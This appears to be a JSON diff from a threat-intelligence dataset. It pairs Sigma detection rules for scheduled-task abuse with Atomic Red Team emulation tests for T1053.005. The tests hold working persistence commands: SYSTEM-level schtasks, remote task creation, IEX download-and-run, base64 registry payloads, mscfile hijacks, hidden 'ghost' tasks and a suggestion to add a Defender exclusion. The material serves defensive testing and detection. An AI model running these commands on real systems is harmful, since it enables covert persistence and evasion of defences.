+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: selection_service\n  selection_service:\n    EventID: 7045\n    Provider_Name: Service Control Manager\n    ServiceName:\n    - SC Scheduled Scan\n    - UpdatMachine\nfalsepositives:\n- Unknown\nid: 53ba33fd-3a50-4468-a5ef-c583635cfa92\nlevel: critical\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/27\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity - System\n",
+                            "sigma:id": "53ba33fd-3a50-4468-a5ef-c583635cfa92",
+                            "title": "Chafer Activity - System",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4f86b304-3e02-40e3-aa5d-e88a167c9617",
+                        "lookup_data": {
+                            "description": "Detects scheduled task deletion events. Scheduled tasks are likely to be deleted if not used for persistence. Malicious Software often creates tasks directly under the root node e.g. \\TASKNAME",
+                            "raw": "author: David Strassegger, Tim Shelton\ndate: 2021/01/22\ndescription: Detects scheduled task deletion events. Scheduled tasks are likely to\n  be deleted if not used for persistence. Malicious Software often creates tasks directly\n  under the root node e.g. \\TASKNAME\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_contains:\n    TaskName|contains: '\\Mozilla\\Firefox Default Browser Agent '\n  filter_exact:\n    TaskName: \\Microsoft\\Windows\\RemovalTools\\MRT_ERROR_HB\n  selection:\n    EventID: 4699\nfalsepositives:\n- Software installation\nid: 4f86b304-3e02-40e3-aa5d-e88a167c9617\nlevel: low\nlogsource:\n  definition: 'Requirements: The Advanced Audit Policy setting Object Access > Audit\n    Other Object Access Events has to be configured to allow this detection. We also\n    recommend extracting the Command field from the embedded XML in the event data.'\n  product: windows\n  service: security\nmodified: 2023/01/20\nreferences:\n- https://twitter.com/matthewdunwoody/status/1352356685982146562\n- https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4699\nstatus: experimental\ntags:\n- attack.execution\n- attack.privilege_escalation\n- car.2013-08-001\n- attack.t1053.005\ntitle: Scheduled Task Deletion\n",
+                            "sigma:id": "4f86b304-3e02-40e3-aa5d-e88a167c9617",
+                            "title": "Scheduled Task Deletion",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "56c217c3-2de2-479b-990f-5c109ba8458f",
+                        "lookup_data": {
+                            "description": "Detects the creation of a schtask via PowerSploit or Empire Default Configuration.",
+                            "raw": "author: Markus Neis, @Karneades\ndate: 2018/03/06\ndescription: Detects the creation of a schtask via PowerSploit or Empire Default Configuration.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ONLOGON\n    - DAILY\n    - ONIDLE\n    - Updater\n    CommandLine|contains|all:\n    - /Create\n    - /SC\n    - /TN\n    - Updater\n    - /TR\n    - powershell\n    Image|endswith: \\schtasks.exe\n    ParentImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- False positives are possible, depends on organisation and processes\nid: 56c217c3-2de2-479b-990f-5c109ba8458f\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://github.com/0xdeadbeefJERKY/PowerSploit/blob/8690399ef70d2cad10213575ac67e8fa90ddf7c3/Persistence/Persistence.psm1\n- https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/persistence/userland/schtasks.py\nstatus: test\ntags:\n- attack.execution\n- attack.persistence\n- attack.privilege_escalation\n- attack.s0111\n- attack.g0022\n- attack.g0060\n- car.2013-08-001\n- attack.t1053.005\n- attack.t1059.001\ntitle: Default PowerSploit and Empire Schtasks Persistence\n",
+                            "sigma:id": "56c217c3-2de2-479b-990f-5c109ba8458f",
+                            "title": "Default PowerSploit and Empire Schtasks Persistence",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7595ba94-cf3b-4471-aa03-4f6baa9e5fad",
+                        "lookup_data": {
+                            "description": "Detects when adversaries stop services or processes by deleting or disabling their respective scheduled tasks in order to conduct data destructive activities",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/12/05\ndescription: Detects when adversaries stop services or processes by deleting or disabling\n  their respective scheduled tasks in order to conduct data destructive activities\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_ac_power_download:\n    Task|contains: \\Windows\\UpdateOrchestrator\\AC Power Download\n  filter_sys_username:\n    SubjectUserName|endswith: $\n  selection:\n    EventID:\n    - 4699\n    - 4701\n    TaskName|contains:\n    - \\Windows\\SystemRestore\\SR\n    - \\Windows\\Windows Defender\\\n    - \\Windows\\BitLocker\n    - \\Windows\\WindowsBackup\\\n    - \\Windows\\WindowsUpdate\\\n    - \\Windows\\UpdateOrchestrator\\\n    - \\Windows\\ExploitGuard\nfalsepositives:\n- Unknown\nid: 7595ba94-cf3b-4471-aa03-4f6baa9e5fad\nlevel: high\nlogsource:\n  definition: The Advanced Audit Policy setting Object Access > Audit Other Object\n    Access Events has to be configured to allow this detection. We also recommend\n    extracting the Command field from the embedded XML in the event data.\n  product: windows\n  service: security\nmodified: 2022/12/09\nreferences:\n- https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4699\n- https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4701\nrelated:\n- id: dbc1f800-0fe0-4bc0-9c66-292c2abe3f78\n  type: similar\n- id: 9ac94dc8-9042-493c-ba45-3b5e7c86b980\n  type: similar\n- id: 9e3cb244-bdb8-4632-8c90-6079c8f4f16d\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1053.005\ntitle: Important Scheduled Task Deleted/Disabled\n",
+                            "sigma:id": "7595ba94-cf3b-4471-aa03-4f6baa9e5fad",
+                            "title": "Important Scheduled Task Deleted/Disabled",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
+                        "lookup_data": {
+                            "description": "Detects Chafer activity attributed to OilRig as reported in Nyotron report in March 2018",
+                            "raw": "author: Florian Roth (Nextron Systems), Markus Neis, Jonhnathan Ribeiro, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2018/03/23\ndescription: Detects Chafer activity attributed to OilRig as reported in Nyotron report\n  in March 2018\ndetection:\n  condition: 1 of selection*\n  selection_process0:\n    CommandLine|contains: \\Service.exe\n    CommandLine|endswith:\n    - i\n    - u\n  selection_process1:\n  - CommandLine|endswith: \\microsoft\\Taskbar\\autoit3.exe\n  - CommandLine|startswith: C:\\wsc.exe\n  selection_process2:\n    Image|contains: \\Windows\\Temp\\DB\\\n    Image|endswith: .exe\n  selection_process3:\n    CommandLine|contains|all:\n    - \\nslookup.exe\n    - -q=TXT\n    ParentImage|contains: \\Autoit\nfalsepositives:\n- Unknown\nid: ce6e34ca-966d-41c9-8d93-5b06c8b97a06\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/09/19\nreferences:\n- https://nyotron.com/nyotron-discovers-next-generation-oilrig-attacks/\nrelated:\n- id: 53ba33fd-3a50-4468-a5ef-c583635cfa92\n  type: derived\nstatus: test\ntags:\n- attack.persistence\n- attack.g0049\n- attack.t1053.005\n- attack.s0111\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\n- attack.command_and_control\n- attack.t1071.004\ntitle: Chafer Activity\n",
+                            "sigma:id": "ce6e34ca-966d-41c9-8d93-5b06c8b97a06",
+                            "title": "Chafer Activity",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1053.005",
+                "display_name": "Scheduled Task/Job: Scheduled Task",
+                "atomic_tests": [
+                    {
+                        "name": "Scheduled Task Startup Script",
+                        "auto_generated_guid": "fec27f65-db86-4c2d-b66c-61945aee87c2",
+                        "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n",
+                            "cleanup_command": "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Scheduled task Local",
+                        "auto_generated_guid": "42f53695-ad4a-4546-abb6-7d837f644a71",
+                        "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "task_command": {
+                                "description": "What you want to execute",
+                                "type": "string",
+                                "default": "C:\\windows\\system32\\cmd.exe"
+                            },
+                            "time": {
+                                "description": "What time 24 Hour",
+                                "type": "string",
+                                "default": "20:10"
+                            }
+                        },
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": false,
+                            "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n",
+                            "cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1\n"
+                        }
+                    },
+                    {
+                        "name": "Scheduled task Remote",
+                        "auto_generated_guid": "2e5eac3e-327b-4a88-a0c0-c4057039a8dd",
+                        "description": "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "task_command": {
+                                "description": "What you want to execute",
+                                "type": "string",
+                                "default": "C:\\windows\\system32\\cmd.exe"
+                            },
+                            "time": {
+                                "description": "What time 24 Hour",
+                                "type": "string",
+                                "default": "20:10"
+                            },
+                            "target": {
+                                "description": "Target",
+                                "type": "string",
+                                "default": "localhost"
+                            },
+                            "user_name": {
+                                "description": "Username to authenticate with, format: DOMAIN\\User",
+                                "type": "string",
+                                "default": "DOMAIN\\user"
+                            },
+                            "password": {
+                                "description": "Password to authenticate with",
+                                "type": "string",
+                                "default": "At0micStrong"
+                            }
+                        },
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n",
+                            "cleanup_command": "SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN \"Atomic task\" /F >nul 2>&1\n"
+                        }
+                    },
+                    {
+                        "name": "Powershell Cmdlet Scheduled Task",
+                        "auto_generated_guid": "af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd",
+                        "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n",
+                            "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1\n"
+                        }
+                    },
+                    {
+                        "name": "Task Scheduler via VBA",
+                        "auto_generated_guid": "ecd3fa21-7792-41a2-8726-2c5c673414d3",
+                        "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "ms_product": {
+                                "description": "Maldoc application Word",
+                                "type": "string",
+                                "default": "Word"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Microsoft #{ms_product} must be installed\n",
+                                "prereq_command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n",
+                                "get_prereq_command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n",
+                            "name": "powershell",
+                            "cleanup_command": "Unregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false\n"
+                        }
+                    },
+                    {
+                        "name": "WMI Invoke-CimMethod Scheduled Task",
+                        "auto_generated_guid": "e16b3b75-dc9e-4cde-a23d-dfa2d0507b3b",
+                        "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "xml_path": {
+                                "description": "path of vbs to use when creating masquerading files",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "File to copy must exist on disk at specified location (#{xml_path})\n",
+                                "prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml\" -OutFile \"#{xml_path}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": true,
+                            "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
+                            "cleanup_command": "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1\n"
+                        }
+                    },
+                    {
+                        "name": "Scheduled Task Executing Base64 Encoded Commands From Registry",
+                        "auto_generated_guid": "e895677d-4f06-49ab-91b6-ae3742d0a2ba",
+                        "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "time": {
+                                "description": "Daily scheduled task execution time",
+                                "type": "string",
+                                "default": "07:45"
+                            }
+                        },
+                        "executor": {
+                            "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st #{time}\n",
+                            "cleanup_command": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F >nul 2>&1\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F >nul 2>&1\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Import XML Schedule Task with Hidden Attribute",
+                        "auto_generated_guid": "cd925593-fbb4-486d-8def-16cbdf944bf4",
+                        "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "xml_path": {
+                                "description": "path of vbs to use when creating masquerading files",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "File to copy must exist on disk at specified location (#{xml_path})\n",
+                                "prereq_command": "if (Test-Path \"#{xml_path}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{xml_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml\" -OutFile \"#{xml_path}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": true,
+                            "command": "$xml = [System.IO.File]::ReadAllText(\"#{xml_path}\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n",
+                            "cleanup_command": "Unregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1\n"
+                        }
+                    },
+                    {
+                        "name": "PowerShell Modify A Scheduled Task",
+                        "auto_generated_guid": "dda6fc7b-c9a6-4c18-b98d-95ec6542af6d",
+                        "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "name": "powershell",
+                            "elevation_required": false,
+                            "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction\n",
+                            "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1\n"
+                        }
+                    },
+                    {
+                        "name": "Scheduled Task (\"Ghost Task\") via Registry Key Manipulation",
+                        "auto_generated_guid": "704333ca-cc12-4bcf-9916-101844881f54",
+                        "description": "Create a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.\nThis requires a download of the GhostTask binary, which must be run as NT Authority\\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.\nFor further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "task_name": {
+                                "description": "Name of the newly-added task",
+                                "type": "string",
+                                "default": "lilghostie"
+                            },
+                            "task_command": {
+                                "description": "Command you want the task to execute",
+                                "type": "string",
+                                "default": "notepad.exe"
+                            },
+                            "target": {
+                                "description": "System where the task should run",
+                                "type": "string",
+                                "default": "localhost"
+                            },
+                            "user_name": {
+                                "description": "Username to authenticate with, such as ATOMICDOMAIN\\AtomicAdmin",
+                                "type": "string",
+                                "default": "$env:USERDOMAIN + '\\' + $env:USERNAME"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n"
+                            },
+                            {
+                                "description": "GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`\n",
+                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} add #{task_name} \"cmd.exe\" \"/c #{task_command}\" #{user_name} logon\n",
+                            "cleanup_command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\#{target} -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\#{target} delete #{task_name} > nul\n"
+                        }
+                    },
+                    {
+                        "name": "Scheduled Task Persistence via CompMgmt.msc",
+                        "auto_generated_guid": "8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2",
+                        "description": "Adds persistence by abusing `compmgmt.msc` via a scheduled task.\nWhen the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). \nThis technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "task_name": {
+                                "description": "Name of the newly-created scheduled task",
+                                "type": "string",
+                                "default": "CompMgmtBypass"
+                            },
+                            "payload": {
+                                "description": "Command you want the task to execute",
+                                "type": "string",
+                                "default": "calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"compmgmt.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's open the Computer Management console now...\ncompmgmt.msc\n",
+                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f\nschtasks /Delete /TN \"#{task_name}\" /F\n"
+                        }
+                    },
+                    {
+                        "name": "Scheduled Task Persistence via Eventviewer.msc",
+                        "auto_generated_guid": "02124c37-767e-4b76-9383-c9fc366d9d4c",
+                        "description": "Adds persistence by abusing `eventviewer.msc` via a scheduled task.\nWhen the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). \n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "task_name": {
+                                "description": "Name of the newly-created scheduled task",
+                                "type": "string",
+                                "default": "EventViewerBypass"
+                            },
+                            "payload": {
+                                "description": "Command you want the task to execute",
+                                "type": "string",
+                                "default": "calc.exe"
+                            }
+                        },
+                        "executor": {
+                            "name": "command_prompt",
+                            "elevation_required": true,
+                            "command": "reg add \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_EXPAND_SZ /d \"c:\\windows\\System32\\#{payload}\" /f\nschtasks /Create /TN \"#{task_name}\" /TR \"eventvwr.msc\" /SC ONLOGON /RL HIGHEST /F\nECHO Let's run the schedule task ...\nschtasks /Run /TN \"EventViewerBypass\"\n",
+                            "cleanup_command": "reg delete \"HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command\" /f\nschtasks /Delete /TN \"#{task_name}\" /F\n"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 11:42:24"
+}
